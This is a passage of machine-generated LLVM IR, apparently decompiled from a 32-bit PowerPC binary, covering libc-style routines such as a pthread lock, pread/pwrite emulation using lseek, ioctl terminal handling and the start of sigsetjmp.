
dec_label_pc_100082f0:                            ; preds = %dec_label_pc_100082dc.dec_label_pc_100082f0_crit_edge, %dec_label_pc_100082dc.thread
  %v0_100082e4 = phi i32 [ %v0_100082e4.pre, %dec_label_pc_100082dc.dec_label_pc_100082f0_crit_edge ], [ 0, %dec_label_pc_100082dc.thread ]
  %v1_100082e4 = add i32 %v0_100082e4, 12
  %v2_100082e4 = inttoptr i32 %v1_100082e4 to i32*
  %v3_100082e4 = load i32, i32* %v2_100082e4, align 4
  %v1_100082e8 = call i32 @__asm_rlwinm(i32 %v3_100082e4, i32 0, i32 0, i32 30)
  %r9.promoted = load i32, i32* %r9.global-to-local, align 4
  %.pre14 = xor i32 %r9.promoted, %v2_1000828c
  %v5_100082f4 = icmp eq i32 %.pre14, 0
  store i32 %.pre14, i32* @r9, align 4
  br i1 %v5_100082f4, label %dec_label_pc_1000834c, label %dec_label_pc_1000828c

dec_label_pc_10008310:                            ; preds = %dec_label_pc_100082dc
  %v1_10008310 = inttoptr i32 %v0_100082dc.pre to i32*
  %v2_10008310 = load i32, i32* %v1_10008310, align 4
  %v1_10008314 = call i32 @__asm_rlwinm(i32 %v2_10008310, i32 0, i32 0, i32 30)
  store i32 %v1_10008314, i32* @r8, align 4
  %v1_10008318 = add i32 %v1_10008314, 12
  %v2_10008318 = inttoptr i32 %v1_10008318 to i32*
  %v3_10008318 = load i32, i32* %v2_10008318, align 4
  %v1_1000831c = load i32, i32* @r11, align 4
  %v2_1000831c = inttoptr i32 %v1_1000831c to i32*
  store i32 %v3_10008318, i32* %v2_1000831c, align 4
  br label %dec_label_pc_10008330

dec_label_pc_10008330:                            ; preds = %dec_label_pc_10008310, %dec_label_pc_10008330
  %v0_10008324 = load i32, i32* @r3, align 4
  %v1_10008324 = inttoptr i32 %v0_10008324 to i32*
  %v2_10008324 = load i32, i32* %v1_10008324, align 4
  store i32 %v2_10008324, i32* %r9.global-to-local, align 4
  %v1_1000832c = call i32 @__asm_rlwinm(i32 %v2_10008324, i32 0, i32 0, i32 30)
  %r11.promoted = load i32, i32* @r11, align 4
  %.pre15 = xor i32 %r11.promoted, %v2_10008324
  %v5_10008334 = icmp eq i32 %.pre15, 0
  store i32 %.pre15, i32* @r11, align 4
  br i1 %v5_10008334, label %dec_label_pc_1000834c, label %dec_label_pc_10008330

dec_label_pc_1000834c:                            ; preds = %dec_label_pc_100082f0, %dec_label_pc_10008330
  %v0_10008350 = load i32, i32* @r8, align 4
  store i32 %v0_10008350, i32* @r3, align 4
  %v2_10008354 = add i32 %v0_10008350, 12
  %v3_10008354 = inttoptr i32 %v2_10008354 to i32*
  store i32 0, i32* %v3_10008354, align 4
  store i32 268469084, i32* @lr, align 4
  %v1_10008358 = call i32 @restart.9(i32 %v0_10008350)
  br label %dec_label_pc_1000835c

dec_label_pc_1000835c:                            ; preds = %dec_label_pc_10008270, %dec_label_pc_1000834c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_100082d0, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000835c, { 1, 0 }
  uselistorder label %dec_label_pc_1000834c, { 1, 0 }
  uselistorder label %dec_label_pc_10008330, { 1, 0 }
  uselistorder label %dec_label_pc_100082c8, { 1, 0 }
  uselistorder label %dec_label_pc_100082b4, { 1, 0 }
}

define i32 @__pthread_lock() local_unnamed_addr {
entry:
  %v0_1000837c = load i32, i32* @r3, align 4
  store i32 %v0_1000837c, i32* @r30, align 4
  %v0_10008384 = load i32, i32* @r4, align 4
  store i32 %v0_10008384, i32* @r31, align 4
  %v1_10008388 = inttoptr i32 %v0_1000837c to i32*
  %v2_10008388 = load i32, i32* %v1_10008388, align 4
  store i32 %v2_10008388, i32* @r9, align 4
  %v3_1000838c = icmp eq i32 %v2_10008388, 0
  br i1 %v3_1000838c, label %dec_label_pc_10008398, label %dec_label_pc_100083b8

dec_label_pc_10008398:                            ; preds = %entry
  %r10.promoted10 = load i32, i32* @r10, align 4
  %v5_1000839c = icmp eq i32 %r10.promoted10, 0
  br i1 %v5_1000839c, label %dec_label_pc_10008450, label %dec_label_pc_100083b8

dec_label_pc_100083b8:                            ; preds = %entry, %dec_label_pc_10008398
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_100083bc

dec_label_pc_100083bc:                            ; preds = %dec_label_pc_100083bc.backedge, %dec_label_pc_100083b8
  %v0_100083e4.pr = phi i32 [ %v0_100083e4.pr.pre, %dec_label_pc_100083bc.backedge ], [ %v0_10008384, %dec_label_pc_100083b8 ]
  %v0_100083bc = phi i32 [ %v0_100083bc.pre, %dec_label_pc_100083bc.backedge ], [ %v0_1000837c, %dec_label_pc_100083b8 ]
  %v1_100083bc = inttoptr i32 %v0_100083bc to i32*
  %v2_100083bc = load i32, i32* %v1_100083bc, align 4
  store i32 %v2_100083bc, i32* @r9, align 4
  store i32 1, i32* @r11, align 4
  %v1_100083c4 = urem i32 %v2_100083bc, 2
  %v3_100083c4 = icmp eq i32 %v1_100083c4, 0
  br i1 %v3_100083c4, label %dec_label_pc_100083e4, label %dec_label_pc_100083d0

dec_label_pc_100083d0:                            ; preds = %dec_label_pc_100083bc
  %v3_100083d0 = icmp eq i32 %v0_100083e4.pr, 0
  br i1 %v3_100083d0, label %dec_label_pc_100083d8, label %dec_label_pc_100083dc

dec_label_pc_100083d8:                            ; preds = %dec_label_pc_100083d0
  %v0_100083d8 = load i32, i32* @r2, align 4
  store i32 %v0_100083d8, i32* @r31, align 4
  br label %dec_label_pc_100083dc

dec_label_pc_100083dc:                            ; preds = %dec_label_pc_100083d0, %dec_label_pc_100083d8
  %v0_100083dc = phi i32 [ %v0_100083e4.pr, %dec_label_pc_100083d0 ], [ %v0_100083d8, %dec_label_pc_100083d8 ]
  store i32 0, i32* @r11, align 4
  br label %dec_label_pc_100083e4

dec_label_pc_100083e4:                            ; preds = %dec_label_pc_100083bc, %dec_label_pc_100083dc
  %v1_100083ec = phi i32 [ %v0_100083dc, %dec_label_pc_100083dc ], [ %v0_100083e4.pr, %dec_label_pc_100083bc ]
  %v3_100083e4 = icmp eq i32 %v1_100083ec, 0
  br i1 %v3_100083e4, label %dec_label_pc_100083f4, label %dec_label_pc_100083ec

dec_label_pc_100083ec:                            ; preds = %dec_label_pc_100083e4
  %v2_100083ec = add i32 %v1_100083ec, 12
  %v3_100083ec = inttoptr i32 %v2_100083ec to i32*
  store i32 %v2_100083bc, i32* %v3_100083ec, align 4
  %v0_100083f8.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_100083f4

dec_label_pc_100083f4:                            ; preds = %dec_label_pc_100083e4, %dec_label_pc_100083ec
  %v0_100083f8 = phi i32 [ %v0_100083f8.pre, %dec_label_pc_100083ec ], [ %v2_100083bc, %dec_label_pc_100083e4 ]
  %r10.promoted = load i32, i32* @r10, align 4
  %.pre = xor i32 %r10.promoted, %v0_100083f8
  %v5_100083f8 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r10, align 4
  br i1 %v5_100083f8, label %dec_label_pc_10008414, label %dec_label_pc_10008408.dec_label_pc_100083bc.backedge_crit_edge

dec_label_pc_10008408.dec_label_pc_100083bc.backedge_crit_edge: ; preds = %dec_label_pc_100083f4
  %v0_100083e4.pr.pre.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100083bc.backedge

dec_label_pc_100083bc.backedge:                   ; preds = %dec_label_pc_1000841c, %dec_label_pc_10008408.dec_label_pc_100083bc.backedge_crit_edge
  %v0_100083e4.pr.pre = phi i32 [ %v0_100083e4.pr.pre.pre, %dec_label_pc_10008408.dec_label_pc_100083bc.backedge_crit_edge ], [ %v0_10008424, %dec_label_pc_1000841c ]
  %v0_100083bc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100083bc

dec_label_pc_10008414:                            ; preds = %dec_label_pc_100083f4
  %v0_10008414 = load i32, i32* @r11, align 4
  %v3_10008414 = icmp eq i32 %v0_10008414, 0
  br i1 %v3_10008414, label %dec_label_pc_1000841c.preheader, label %dec_label_pc_1000843c.preheader

dec_label_pc_1000841c.preheader:                  ; preds = %dec_label_pc_10008414
  %v0_1000841c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000841c

dec_label_pc_1000843c.preheader:                  ; preds = %dec_label_pc_10008414
  %v0_1000843c1 = load i32, i32* @r29, align 4
  %v3_1000843c4 = icmp eq i32 %v0_1000843c1, 0
  %v0_100084405 = load i32, i32* @r31, align 4
  store i32 %v0_100084405, i32* @r3, align 4
  %v1_100084447 = add i32 %v0_1000843c1, -1
  store i32 %v1_100084447, i32* @r29, align 4
  br i1 %v3_1000843c4, label %dec_label_pc_10008450, label %dec_label_pc_10008438

dec_label_pc_1000841c:                            ; preds = %dec_label_pc_1000841c.preheader, %dec_label_pc_10008430
  %v0_1000841c = phi i32 [ %v0_1000841c.pre, %dec_label_pc_1000841c.preheader ], [ %v0_10008424, %dec_label_pc_10008430 ]
  store i32 %v0_1000841c, i32* @r3, align 4
  store i32 268469284, i32* @lr, align 4
  %v0_10008420 = call i32 @suspend.10()
  %v0_10008424 = load i32, i32* @r31, align 4
  %v1_10008424 = add i32 %v0_10008424, 12
  %v2_10008424 = inttoptr i32 %v1_10008424 to i32*
  %v3_10008424 = load i32, i32* %v2_10008424, align 4
  %v3_10008428 = icmp eq i32 %v3_10008424, 0
  br i1 %v3_10008428, label %dec_label_pc_100083bc.backedge, label %dec_label_pc_10008430

dec_label_pc_10008430:                            ; preds = %dec_label_pc_1000841c
  br label %dec_label_pc_1000841c

dec_label_pc_10008438:                            ; preds = %dec_label_pc_1000843c.preheader, %dec_label_pc_10008438
  %v0_100084408 = phi i32 [ %v0_10008440, %dec_label_pc_10008438 ], [ %v0_100084405, %dec_label_pc_1000843c.preheader ]
  store i32 268469308, i32* @lr, align 4
  %v1_10008438 = call i32 @restart.9(i32 %v0_100084408)
  %v0_1000843c = load i32, i32* @r29, align 4
  %v3_1000843c = icmp eq i32 %v0_1000843c, 0
  %v0_10008440 = load i32, i32* @r31, align 4
  store i32 %v0_10008440, i32* @r3, align 4
  %v1_10008444 = add i32 %v0_1000843c, -1
  store i32 %v1_10008444, i32* @r29, align 4
  br i1 %v3_1000843c, label %dec_label_pc_10008450, label %dec_label_pc_10008438

dec_label_pc_10008450:                            ; preds = %dec_label_pc_10008438, %dec_label_pc_1000843c.preheader, %dec_label_pc_10008398
  %.0 = phi i32 [ undef, %dec_label_pc_10008398 ], [ %v0_100084405, %dec_label_pc_1000843c.preheader ], [ %v0_10008440, %dec_label_pc_10008438 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_10008440, { 0, 2, 1 }
  uselistorder i32 %v0_10008424, { 2, 0, 1 }
  uselistorder i32 %v0_100084405, { 1, 0, 2 }
  uselistorder i32 %v2_100083bc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_100083e4.pr, { 2, 0, 1 }
  uselistorder i32 ()* @suspend.10, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008438, { 1, 0 }
  uselistorder label %dec_label_pc_1000841c, { 1, 0 }
  uselistorder label %dec_label_pc_100083f4, { 1, 0 }
  uselistorder label %dec_label_pc_100083e4, { 1, 0 }
  uselistorder label %dec_label_pc_100083dc, { 1, 0 }
  uselistorder label %dec_label_pc_100083b8, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10008474 = load i32, i32* @r7, align 4
  store i32 %v0_10008474, i32* %r28.global-to-local, align 4
  %v0_10008488 = load i32, i32* @r8, align 4
  store i32 %v0_10008488, i32* %r29.global-to-local, align 4
  %v0_1000848c = load i32, i32* @r4, align 4
  store i32 %v0_1000848c, i32* %r26.global-to-local, align 4
  %v0_10008490 = load i32, i32* @r9, align 4
  store i32 %v0_10008490, i32* %r24.global-to-local, align 4
  store i32 %arg1, i32* %r27.global-to-local, align 4
  store i32 268469404, i32* @lr, align 4
  %v4_10008498 = call i32 @__libc_lseek64(i32 0, i32 0, i32 1, i32 0)
  store i32 %v4_10008498, i32* %r30.global-to-local, align 4
  %v0_100084a0 = load i32, i32* @r4, align 4
  store i32 %v0_100084a0, i32* @r31, align 4
  %v3_100084a4 = icmp eq i32 %v4_10008498, -1
  br i1 %v3_100084a4, label %dec_label_pc_100084ac, label %dec_label_pc_100084b4

dec_label_pc_100084ac:                            ; preds = %entry
  %v3_100084ac = icmp eq i32 %v0_100084a0, -1
  br i1 %v3_100084ac, label %dec_label_pc_10008548, label %dec_label_pc_100084b4

dec_label_pc_100084b4:                            ; preds = %entry, %dec_label_pc_100084ac
  %v0_100084b4 = load i32, i32* %r28.global-to-local, align 4
  %v0_100084b8 = load i32, i32* %r29.global-to-local, align 4
  %v0_100084bc = load i32, i32* %r27.global-to-local, align 4
  store i32 268469448, i32* @lr, align 4
  %v4_100084c4 = call i32 @__libc_lseek64(i32 %v0_100084bc, i32 %v0_100084b4, i32 %v0_100084b8, i32 0)
  %v3_100084c8 = icmp eq i32 %v4_100084c4, -1
  br i1 %v3_100084c8, label %dec_label_pc_100084d0, label %dec_label_pc_100084d8

dec_label_pc_100084d0:                            ; preds = %dec_label_pc_100084b4
  %v0_100084d0 = load i32, i32* @r4, align 4
  %v3_100084d0 = icmp eq i32 %v0_100084d0, -1
  br i1 %v3_100084d0, label %dec_label_pc_10008548, label %dec_label_pc_100084d8

dec_label_pc_100084d8:                            ; preds = %dec_label_pc_100084b4, %dec_label_pc_100084d0
  %v0_100084d8 = load i32, i32* %r24.global-to-local, align 4
  %v3_100084d8 = icmp eq i32 %v0_100084d8, 1
  %v0_100084e8 = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_100084d8, label %dec_label_pc_100084e0, label %dec_label_pc_100084f4

dec_label_pc_100084e0:                            ; preds = %dec_label_pc_100084d8
  %v0_100084e0 = load i32, i32* %r26.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100084f0.268 to i32), i32* @lr, align 4
  %v2_100084ec = call i32 @__libc_write(i32 %v0_100084e8, i32 %v0_100084e0)
  br label %dec_label_pc_10008504

dec_label_pc_100084f4:                            ; preds = %dec_label_pc_100084d8
  store i32 268469508, i32* @lr, align 4
  %v1_10008500 = call i32 @__libc_read(i32 %v0_100084e8)
  br label %dec_label_pc_10008504

dec_label_pc_10008504:                            ; preds = %dec_label_pc_100084e0, %dec_label_pc_100084f4
  %storemerge = phi i32 [ %v1_10008500, %dec_label_pc_100084f4 ], [ %v2_100084ec, %dec_label_pc_100084e0 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v0_10008508 = call i32 @__errno_location()
  store i32 %v0_10008508, i32* %r29.global-to-local, align 4
  %v0_10008510 = load i32, i32* @r31, align 4
  %v0_10008514 = load i32, i32* %r30.global-to-local, align 4
  %v0_10008518 = load i32, i32* %r27.global-to-local, align 4
  %v1_10008520 = inttoptr i32 %v0_10008508 to i32*
  %v2_10008520 = load i32, i32* %v1_10008520, align 4
  store i32 %v2_10008520, i32* @r31, align 4
  store i32 268469544, i32* @lr, align 4
  %v4_10008524 = call i32 @__libc_lseek64(i32 %v0_10008518, i32 %v0_10008514, i32 %v0_10008510, i32 0)
  %v3_10008528 = icmp eq i32 %v4_10008524, -1
  br i1 %v3_10008528, label %dec_label_pc_10008530, label %dec_label_pc_10008540

dec_label_pc_10008530:                            ; preds = %dec_label_pc_10008504
  %v0_10008530 = load i32, i32* @r4, align 4
  %v3_10008530 = icmp eq i32 %v0_10008530, -1
  br i1 %v3_10008530, label %dec_label_pc_10008538, label %dec_label_pc_10008540

dec_label_pc_10008538:                            ; preds = %dec_label_pc_10008530
  %v0_10008538 = load i32, i32* %r28.global-to-local, align 4
  %v3_10008538 = icmp eq i32 %v0_10008538, -1
  br i1 %v3_10008538, label %dec_label_pc_10008540, label %dec_label_pc_10008548

dec_label_pc_10008540:                            ; preds = %dec_label_pc_10008538, %dec_label_pc_10008530, %dec_label_pc_10008504
  %v0_10008540 = load i32, i32* @r31, align 4
  %v1_10008540 = load i32, i32* %r29.global-to-local, align 4
  %v2_10008540 = inttoptr i32 %v1_10008540 to i32*
  store i32 %v0_10008540, i32* %v2_10008540, align 4
  %v0_10008550.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000854c

dec_label_pc_10008548:                            ; preds = %dec_label_pc_10008538, %dec_label_pc_100084d0, %dec_label_pc_100084ac
  store i32 -1, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000854c

dec_label_pc_1000854c:                            ; preds = %dec_label_pc_10008540, %dec_label_pc_10008548
  %v0_10008550 = phi i32 [ %v0_10008550.pre, %dec_label_pc_10008540 ], [ -1, %dec_label_pc_10008548 ]
  ret i32 %v0_10008550

; uselistorder directives
  uselistorder i32* %r28.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000854c, { 1, 0 }
  uselistorder label %dec_label_pc_10008504, { 1, 0 }
  uselistorder label %dec_label_pc_100084d8, { 1, 0 }
  uselistorder label %dec_label_pc_100084b4, { 1, 0 }
}

define i32 @__libc_pwrite64() local_unnamed_addr {
entry:
  store i32 1, i32* @r9, align 4
  %v1_10008568 = call i32 @__fake_pread_write64(i32 1)
  ret i32 %v1_10008568
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 0, i32* @r9, align 4
  %v1_10008570 = call i32 @__fake_pread_write64(i32 0)
  ret i32 %v1_10008570

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v0_10008580 = load i32, i32* @r4, align 4
  store i32 %v0_10008580, i32* %r28.global-to-local, align 4
  %v0_10008594 = load i32, i32* @r6, align 4
  store i32 %v0_10008594, i32* @r31, align 4
  %v0_10008598 = load i32, i32* @r7, align 4
  store i32 %v0_10008598, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  store i32 268469668, i32* @lr, align 4
  %v3_100085a0 = call i32 @__GI___libc_lseek(i32 0, i32 1, i32 1)
  %v3_100085a4 = icmp eq i32 %v3_100085a0, -1
  store i32 %v3_100085a0, i32* %r26.global-to-local, align 4
  br i1 %v3_100085a4, label %dec_label_pc_1000862c, label %dec_label_pc_100085b0

dec_label_pc_100085b0:                            ; preds = %entry
  %v0_100085b0 = load i32, i32* @r31, align 4
  %v0_100085b4 = load i32, i32* %r29.global-to-local, align 4
  store i32 268469696, i32* @lr, align 4
  %v3_100085bc = call i32 @__GI___libc_lseek(i32 %v0_100085b4, i32 %v0_100085b0, i32 0)
  %v3_100085c0 = icmp eq i32 %v3_100085bc, -1
  br i1 %v3_100085c0, label %dec_label_pc_1000862c, label %dec_label_pc_100085c8

dec_label_pc_100085c8:                            ; preds = %dec_label_pc_100085b0
  %v0_100085c8 = load i32, i32* %r30.global-to-local, align 4
  %v3_100085c8 = icmp eq i32 %v0_100085c8, 1
  %v0_100085d8 = load i32, i32* %r29.global-to-local, align 4
  br i1 %v3_100085c8, label %dec_label_pc_100085d0, label %dec_label_pc_100085e4

dec_label_pc_100085d0:                            ; preds = %dec_label_pc_100085c8
  %v0_100085d0 = load i32, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100085e0.269 to i32), i32* @lr, align 4
  %v2_100085dc = call i32 @__libc_write(i32 %v0_100085d8, i32 %v0_100085d0)
  br label %dec_label_pc_100085f4

dec_label_pc_100085e4:                            ; preds = %dec_label_pc_100085c8
  store i32 268469748, i32* @lr, align 4
  %v1_100085f0 = call i32 @__libc_read(i32 %v0_100085d8)
  br label %dec_label_pc_100085f4

dec_label_pc_100085f4:                            ; preds = %dec_label_pc_100085d0, %dec_label_pc_100085e4
  %storemerge = phi i32 [ %v1_100085f0, %dec_label_pc_100085e4 ], [ %v2_100085dc, %dec_label_pc_100085d0 ]
  store i32 %storemerge, i32* %r30.global-to-local, align 4
  %v0_100085f8 = call i32 @__errno_location()
  store i32 %v0_100085f8, i32* @r31, align 4
  %v0_10008600 = load i32, i32* %r26.global-to-local, align 4
  %v0_10008604 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000860c = inttoptr i32 %v0_100085f8 to i32*
  %v2_1000860c = load i32, i32* %v1_1000860c, align 4
  store i32 %v2_1000860c, i32* %r29.global-to-local, align 4
  store i32 268469780, i32* @lr, align 4
  %v3_10008610 = call i32 @__GI___libc_lseek(i32 %v0_10008604, i32 %v0_10008600, i32 0)
  %v3_10008614 = icmp eq i32 %v3_10008610, -1
  br i1 %v3_10008614, label %dec_label_pc_1000861c, label %dec_label_pc_10008624

dec_label_pc_1000861c:                            ; preds = %dec_label_pc_100085f4
  %v0_1000861c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000861c = icmp eq i32 %v0_1000861c, -1
  br i1 %v3_1000861c, label %dec_label_pc_10008624, label %dec_label_pc_1000862c

dec_label_pc_10008624:                            ; preds = %dec_label_pc_1000861c, %dec_label_pc_100085f4
  %v0_10008624 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008624 = load i32, i32* @r31, align 4
  %v2_10008624 = inttoptr i32 %v1_10008624 to i32*
  store i32 %v0_10008624, i32* %v2_10008624, align 4
  %v0_10008634.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008630

dec_label_pc_1000862c:                            ; preds = %dec_label_pc_1000861c, %dec_label_pc_100085b0, %entry
  store i32 -1, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008630

dec_label_pc_10008630:                            ; preds = %dec_label_pc_10008624, %dec_label_pc_1000862c
  %v0_10008634 = phi i32 [ %v0_10008634.pre, %dec_label_pc_10008624 ], [ -1, %dec_label_pc_1000862c ]
  ret i32 %v0_10008634

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008630, { 1, 0 }
  uselistorder label %dec_label_pc_100085f4, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 1, i32* @r7, align 4
  %v1_1000864c = call i32 @__fake_pread_write(i32 1)
  ret i32 %v1_1000864c
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @r7, align 4
  %v1_10008654 = call i32 @__fake_pread_write(i32 0)
  ret i32 %v1_10008654

; uselistorder directives
  uselistorder i32 (i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 -2143521772, i32* @r10, align 4
  %v4_10008668 = icmp eq i32 %arg2, -2143521772
  %v2_1000867c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000867c, i32* %stack_var_-32, align 4
  br i1 %v4_10008668, label %dec_label_pc_100086dc, label %dec_label_pc_1000869c

dec_label_pc_1000869c:                            ; preds = %entry
  %v3_1000869c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000869c, label %dec_label_pc_100086b4, label %dec_label_pc_100086a4

dec_label_pc_100086a4:                            ; preds = %dec_label_pc_1000869c
  %v3_100086a8 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_100086a8, label %dec_label_pc_100086d0, label %dec_label_pc_100086fc

dec_label_pc_100086b4:                            ; preds = %dec_label_pc_1000869c
  %v1_100086b4 = xor i32 %arg2, -2143551488
  %v3_100086b8 = icmp eq i32 %v1_100086b4, 29717
  br i1 %v3_100086b8, label %dec_label_pc_100086ec, label %dec_label_pc_100086c0

dec_label_pc_100086c0:                            ; preds = %dec_label_pc_100086b4
  %v3_100086c4 = icmp eq i32 %v1_100086b4, 29718
  br i1 %v3_100086c4, label %dec_label_pc_100086f4, label %dec_label_pc_100086fc

dec_label_pc_100086d0:                            ; preds = %dec_label_pc_100086a4
  store i32 ptrtoint (i32* @global_var_100086d8.270 to i32), i32* @lr, align 4
  %v1_100086d4 = inttoptr i32 %arg3 to i32*
  %v2_100086d4 = call i32 @__GI_tcgetattr(i32* %v1_100086d4)
  br label %dec_label_pc_100086e4

dec_label_pc_100086dc:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_100086e0

dec_label_pc_100086e0:                            ; preds = %dec_label_pc_100086f4, %dec_label_pc_100086ec, %dec_label_pc_100086dc
  store i32 268469988, i32* @lr, align 4
  %v0_100086e0 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_100086e4

dec_label_pc_100086e4:                            ; preds = %dec_label_pc_100086d0, %dec_label_pc_100086e0
  %storemerge = phi i32 [ %v0_100086e0, %dec_label_pc_100086e0 ], [ %v2_100086d4, %dec_label_pc_100086d0 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008728

dec_label_pc_100086ec:                            ; preds = %dec_label_pc_100086b4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_100086e0

dec_label_pc_100086f4:                            ; preds = %dec_label_pc_100086c0
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_100086e0

dec_label_pc_100086fc:                            ; preds = %dec_label_pc_100086c0, %dec_label_pc_100086a4
  %v0_1000870c = call i32 @__asm_mfcr()
  %v1_10008710 = and i32 %v0_1000870c, 268435456
  %v3_10008710 = icmp eq i32 %v1_10008710, 0
  store i32 %v0_1000870c, i32* %r31.global-to-local, align 4
  br i1 %v3_10008710, label %dec_label_pc_10008728, label %dec_label_pc_1000871c

dec_label_pc_1000871c:                            ; preds = %dec_label_pc_100086fc
  %v0_1000871c = call i32 @__errno_location()
  %v0_10008720 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008720 = inttoptr i32 %v0_1000871c to i32*
  store i32 %v0_10008720, i32* %v2_10008720, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008728

dec_label_pc_10008728:                            ; preds = %dec_label_pc_100086fc, %dec_label_pc_100086e4, %dec_label_pc_1000871c
  %v0_1000872c = phi i32 [ %v0_1000870c, %dec_label_pc_100086fc ], [ %storemerge, %dec_label_pc_100086e4 ], [ -1, %dec_label_pc_1000871c ]
  ret i32 %v0_1000872c

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10008728, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100086e4, { 1, 0 }
}

define i32 @__sigsetjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  store i32 0, i32* %r14.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_10008740 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v3_10008740, i32* %arg1, align 4
  %v0_10008744 = load i32, i32* @lr, align 4
  store i32 %v0_10008744, i32* %r0.global-to-local, align 4
  %v0_10008748 = load i32, i32* @r2, align 4
  %v2_10008748 = add i32 %tmp, 4
  %v3_10008748 = inttoptr i32 %v2_10008748 to i32*
  store i32 %v0_10008748, i32* %v3_10008748, align 4
  %v0_1000874c = load i32, i32* %r14.global-to-local, align 4
  %v2_1000874c = add i32 %tmp, 12
  %v3_1000874c = inttoptr i32 %v2_1000874c to i32*
  store i32 %v0_1000874c, i32* %v3_1000874c, align 4
  %v0_10008754 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008754 = add i32 %tmp, 8
  %v3_10008754 = inttoptr i32 %v2_10008754 to i32*
  store i32 %v0_10008754, i32* %v3_10008754, align 4
  %v0_10008758 = load i32, i32* %r15.global-to-local, align 4
  %v2_10008758 = add i32 %tmp, 16
  %v3_10008758 = inttoptr i32 %v2_10008758 to i32*
  store i32 %v0_10008758, i32* %v3_10008758, align 4
  %v0_10008760 = call i32 @__asm_mfcr()
  store i32 %v0_10008760, i32* @r3, align 4
  store i32 %v0_10008760, i32* %r0.global-to-local, align 4
  %v0_10008764 = load i32, i32* @r16, align 4
  %v2_10008764 = add i32 %v0_10008760, 20
  %v3_10008764 = inttoptr i32 %v2_10008764 to i32*
  store i32 %v0_10008764, i32* %v3_10008764, align 4
  %v2_1000876c = add i32 %v0_10008760, 84
  %v3_1000876c = inttoptr i32 %v2_1000876c to i32*
  store i32 %v0_10008760, i32* %v3_1000876c, align 4
  %v0_10008770 = load i32, i32* @r17, align 4
  %v2_10008770 = add i32 %v0_10008760, 24
  %v3_10008770 = inttoptr i32 %v2_10008770 to i32*
  store i32 %v0_10008770, i32* %v3_10008770, align 4
  %v0_10008778 = load i32, i32* @r18, align 4
  %v2_10008778 = add i32 %v0_10008760, 28
  %v3_10008778 = inttoptr i32 %v2_10008778 to i32*
  store i32 %v0_10008778, i32* %v3_10008778, align 4
  %v0_10008780 = load i32, i32* @r19, align 4
